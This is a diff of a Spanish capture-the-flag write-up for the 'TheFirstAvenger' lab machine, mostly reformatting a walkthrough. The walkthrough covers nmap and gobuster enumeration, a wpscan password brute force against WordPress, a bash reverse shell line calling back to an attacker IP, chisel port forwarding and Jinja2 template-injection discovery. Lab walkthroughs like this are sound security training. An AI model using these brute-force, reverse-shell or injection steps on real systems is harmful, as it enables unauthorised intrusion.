@@ -11,6 +11,7 @@ URL: https://thehackerslabs.com/thefirstavenger/
 ### IP de máquina víctima
 
 Después de prender tu máquina víctima, se muestra la IP
+
 ![ip_vm](img/ip_vm.png)
 
 O puedes averiguarlo desde tu máquina atacante con
@@ -18,6 +19,7 @@ O puedes averiguarlo desde tu máquina atacante con
 sudo arp-scan -l
 ```
 para escanear la red local e identificar todos los dispositivos conectados a ella.
+
 ![vm_victima](img/vm_victima.png)
 
 Visualizamos la IP 10.0.2.32 de la máquina víctima
@@ -34,9 +36,10 @@ Y vemos que sí tenemos comunicación
 
 ### Creación de espacio de trabajo (opcional)
 
-Esto es a criterio de cada uno. En mi caso particular:
-1. Creo una carpeta con el nombre de la máquina víctima
-2. Creo una carpeta dentro con el IP de máquina víctima
+Esto es a criterio de cada uno. En mi caso particular:  
+- Creo una carpeta con el nombre de la máquina víctima  
+-  Creo una carpeta dentro con el IP de máquina víctima
+  
 ![workspace](img/workspace.png)
 
 ## Enumeración
@@ -46,15 +49,15 @@ Esto es a criterio de cada uno. En mi caso particular:
 ```bash
 nmap -sSCV -p- 10.0.2.32 -oN scan --min-rate 5000 -n -Pn
 ```
--sS: Realiza un escaneo SYN que es rápido y sigiloso porque no completa la conexión TCP.
--sC: Ejecuta los scripts NSE (Nmap Scripting Engine) predeterminados para detectar vulnerabilidades comunes.
--sV: Detecta versiones de servicios que están en ejecución en los puertos abiertos.
--p-: Escanea todos los puertos (del 1 al 65535) y asegura que ningún puerto quede sin escanear.
-10.0.2.32: Dirección IP del objetivo.
--oN scan: Guarda la salida en formato normal en un archivo llamado scan.
---min-rate 5000: Establece una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo.
--n: Acelerar el escaneo al evitar la resolución de nombres de dominio.
--Pn: Trata todos los hosts como activos y omite el paso de ping.
+-sS: Realiza un escaneo SYN que es rápido y sigiloso porque no completa la conexión TCP.  
+-sC: Ejecuta los scripts NSE (Nmap Scripting Engine) predeterminados para detectar vulnerabilidades comunes.  
+-sV: Detecta versiones de servicios que están en ejecución en los puertos abiertos.  
+-p-: Escanea todos los puertos (del 1 al 65535) y asegura que ningún puerto quede sin escanear.  
+10.0.2.32: Dirección IP del objetivo.  
+-oN scan: Guarda la salida en formato normal en un archivo llamado scan.  
+--min-rate 5000: Establece una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo.  
+-n: Acelerar el escaneo al evitar la resolución de nombres de dominio.  
+-Pn: Trata todos los hosts como activos y omite el paso de ping.  
 
 ![nmap](img/nmap.png)
 
@@ -65,9 +68,11 @@ Damos un vistazo rápidamente al puerto 80 con whatweb
 ![whatweb](img/whatweb.png)
 
 Vemos que hay una web corriendo sobre apache, así que la visitamos en el navegador
+
 ![web_browser](img/web_browser.png)
 
 Revisamos su código fuente
+
 ![source](img/source.png)
 
 Podemos verificar que no hay información relevante.
@@ -77,20 +82,22 @@ Por esto usamos gobuster de la siguiente manera
 ```bash
 gobuster dir -u 10.0.2.32 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,txt
 ```
-dir: Utiliza gobuster para descubrir directorios en el servidor web.
--u 10.0.2.32: Establece la URL objetivo a escanear.
--w: Usa el archivo de lista de palabras especificado para realizar el escaneo de directorios.
--t 200: Establece 200 hilos para el escaneo concurrente, lo que acelera el proceso.
--x php,txt: Agrega extensiones php y txt a los directorios buscados, lo que ayuda a descubrir archivos con esas extensiones.
+dir: Utiliza gobuster para descubrir directorios en el servidor web.  
+-u 10.0.2.32: Establece la URL objetivo a escanear.  
+-w: Usa el archivo de lista de palabras especificado para realizar el escaneo de directorios.  
+-t 200: Establece 200 hilos para el escaneo concurrente, lo que acelera el proceso.  
+-x php,txt: Agrega extensiones php y txt a los directorios buscados, lo que ayuda a descubrir archivos con esas extensiones.  
 
 ![gobuster_main](img/gobuster_main.png)
 
 Hemos encontrado un directorio interesante, llamado wp1 así que ingresaremos a él por el navegador y usamos la herramienta wappalyzer del navegador para ver información adicional de ella.
+
 ![wappalyzer](img/wappalyzer.png)
 
 Vemos que estamos tratando con una web WordPress versión 6.6.2. Es una versión muy reciente.
 
 Revisamos también el código fuente
+
 ![source_wp](img/source_wp.png)
 
 Vemos que existe un redireccionamiento a thefirstavenger.thl, así que lo colocamos en /etc/hosts de la siguiente manera
@@ -102,6 +109,7 @@ sudo nano /etc/hosts
 ![etc_hosts2](img/etc_hosts2.png)
 
 Y lo ingresamos en la url, ahora con ese host
+
 ![wp1_new](img/wp1_new.png)
 
 Ahora iremos a 10.0.2.32/wp1/wp-admin que es una dirección clásica de WordPress para realizar login, y probamos las credenciales por defecto, user:admin y password:admin
@@ -120,10 +128,8 @@ WPScan nos sirve para realizar un escaneo de vulnerabilidades en un sitio web de
 wpscan --url http://10.0.2.32/wp1/ -U admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
 ```
 
---url http://10.0.2.32/wp1/: Especifica la URL del sitio web de WordPress objetivo para el escaneo.
-
--U admin: Define el nombre de usuario como admin para intentar ataques de fuerza bruta.
-
+--url http://10.0.2.32/wp1/: Especifica la URL del sitio web de WordPress objetivo para el escaneo.  
+-U admin: Define el nombre de usuario como admin para intentar ataques de fuerza bruta.  
 -P: Utiliza la lista de passwords especificada para realizar el ataque de fuerza bruta, probando las passwords en el archivo contra el usuario admin.
 
 ![wpscan_admin](img/wpscan_admin.png)
@@ -165,11 +171,10 @@ bash -i >& /dev/tcp/10.0.2.15/1234 0>&1
 
 Este ultimo comando se puede generar en https://www.revshells.com/
 
-![revshells](img/revshells.png)
-
-![shell](img/shell.png)
-![script_bash](img/script_bash.png)
-![reverse_shell](img/reverse_shell.png)
+![revshells](img/revshells.png)  
+![shell](img/shell.png)  
+![script_bash](img/script_bash.png)  
+![reverse_shell](img/reverse_shell.png)  
 
 Ahora que tenemos la sesión fuera de metasploit, realizamos un tratamiento de shell con los siguiente comandos
 ```bash
@@ -253,7 +258,7 @@ ss -tuln
 
 Y el servicio que llama la atención es el que se está ejecutando en el puerto 7092, porque el puerto 3306 es de MySQL que ya exploramos y el 33060 no parece ser una web, mientras que la 7092 sí, esto lo comprobamos mediante curl.
 
-![33060](img/33060.png)
+![33060](img/33060.png)  
 ![7092_web](img/7092_web.png)
 
 ### Port Forwarding con Chisel
@@ -292,7 +297,7 @@ Máquina atacante
 ```
 ![chisel_client_atacante](img/chisel_client_atacante.png)
 
-Ahora podemos abrir nuestro navegador y explorar la web que la máquina víctima en el puerto 7092
+Ahora podemos abrir nuestro navegador y explorar la web de la máquina víctima en el puerto 7092
 
 ![port_forwarding](img/port_forwarding.png)
 
@@ -300,7 +305,7 @@ Tenemos visibilidad.
 
 ### Escalamiento de Privilegios
 
-Ahora estamos viendo un web que basicamento ejecuta el comando ping, lo comprobamos ingresando una IP.
+Ahora estamos viendo una web que básicamente ejecuta el comando ping a la IP que coloquemos en el cuadro de texto
 
 ![ping_web](img/ping_web.png)
 
@@ -311,20 +316,27 @@ Vemos que responde al comando, entonces aquí tenemos una vulnerabilidad de SSTI
 Usaremos el recurso siguiente 
 https://cheatsheet.hackmanit.de/template-injection-table/ para ver con qué template Engine se está ejecutando el comando ping y sabiendo esto buscaremos un payload en https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection adecuado para ese Template Injection
 
-Entonces la dinámica es la siguiente, se colocan los comandos ubicados en la parte superior la tabla de Templates en nuestra web y lo que resulte se busca en el dropdown y se selecciona, esto filtrara los resultados, hasta que te indique con alguna precisión solo un Template Engine en el mejor de los casos.
+Entonces la dinámica es la siguiente:  
+- Se colocan los comandos ubicados en la parte superior la tabla de Templates en nuestra web  
+- Lo que resulte se busca en el dropdown y se selecciona  
+- Esto filtrara los resultados  
+- Repetir hasta que se indique con alguna precisión solo un Template Engine en el mejor de los casos.  
 
-![prueba100](img/prueba100.png)
-![prueba101](img/prueba101.png)
-![prueba102](img/prueba102.png)
-![prueba200](img/prueba200.png)
-![prueba201](img/prueba201.png)
-![prueba202](img/prueba202.png)
-![prueba300](img/prueba300.png)
-![prueba301](img/prueba301.png)
-![prueba302](img/prueba302.png)
+![prueba100](img/prueba100.png)  
+![prueba101](img/prueba101.png)  
+![prueba102](img/prueba102.png)  
+![prueba200](img/prueba200.png)  
+![prueba201](img/prueba201.png)  
+![prueba202](img/prueba202.png)  
+![prueba300](img/prueba300.png)  
+![prueba301](img/prueba301.png)  
+![prueba302](img/prueba302.png)  
+
+En este punto ya tenemos una idea de que el Template Engine es Jinja2.  
+
 ![resultado_prueba](img/resultado_prueba.png)
 
-Entonces llegamos a la conclusión que el Template Engine es Jinja2. Entonces buscaremos un payload adecuado en la web PayloadsAllTheThings mencianada anteriormente, en la sección Jinja2 - Remote Code Execution por supuesto.
+Entonces buscaremos un payload adecuado en la web PayloadsAllTheThings mencionada anteriormente, en la sección Jinja2 - Remote Code Execution por supuesto.  
 
 ![payload](img/payload.png)
 
